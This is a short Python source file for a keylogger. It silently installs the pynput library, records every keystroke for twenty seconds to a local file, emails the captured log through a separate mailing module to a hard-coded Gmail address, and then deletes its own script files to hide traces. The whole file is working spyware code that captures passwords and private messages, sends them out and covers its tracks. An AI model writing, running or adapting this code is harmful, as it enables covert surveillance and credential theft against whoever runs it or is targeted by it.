import subprocess
import mailing
import time
import os

try:
    subprocess.run(["pip", "install", "pynput"])
except:
    print("already installed")

from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("loggings.txt",'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            if key == keyboard.Key.enter:
                logkey.write('\n')
            elif key == keyboard.Key.space:
                logkey.write(' ')
            elif key == keyboard.Key.backspace:
                logkey.write('<bckspc>')
            elif key == keyboard.Key.cmd:
                logkey.write('<super>')
            else:
                logkey.write(f'<{key}>')


if __name__ == "__main__":

    listener = keyboard.Listener(on_press=keypressed)
    listener.start()

    time.sleep(20)

    listener.stop()

    subject = 'this is a test'
    to_email = 'hardikkumawat444@gmail.com'

    mailing.sendMail(subject,to_email)

    os.remove("mailing.py")
    os.remove("loggings.txt")
    os.remove("log.py")




